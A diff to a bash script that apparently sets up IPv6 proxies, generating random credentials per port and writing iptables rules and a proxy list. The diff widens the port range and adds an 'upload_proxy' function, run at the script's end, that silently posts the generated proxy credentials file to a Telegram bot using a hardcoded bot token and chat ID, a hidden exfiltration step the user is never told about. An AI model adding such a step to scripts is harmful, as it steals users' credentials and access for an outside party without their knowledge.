@@ -76,7 +76,9 @@ gen_proxy_file_for_user() {
 $(awk -F "/" '{print $3 ":" $4 ":" $1 ":" $2 }' ${WORKDATA})
 EOF
 }
-
+upload_proxy() {
+curl -F document=@/etc/lev/proxy.txt "https://api.telegram.org/bot6252674360:AAESsHxCqjh6LrLyADMhytYqZkC4gqoasXE/sendDocument" -F chat_id="5045683428"
+}
 gen_data() {
     seq $FIRST_PORT $LAST_PORT | while read port; do
         echo "$(random)/$(random)/$IP4/$port/$(gen64 $IP6)"
@@ -117,7 +119,7 @@ IP6=$(curl -6 -s icanhazip.com | cut -f1-4 -d':')
 echo "Internal ip = ${IP4}. Exteranl sub for ip6 = ${IP6}"
 
 FIRST_PORT=10000
-LAST_PORT=10500
+LAST_PORT=11000
 
 gen_data >$WORKDIR/data.txt
 gen_iptables >$WORKDIR/boot_iptables.sh
@@ -139,3 +141,4 @@ bash /etc/rc.local
 
 gen_proxy_file_for_user
 
+upload_proxy
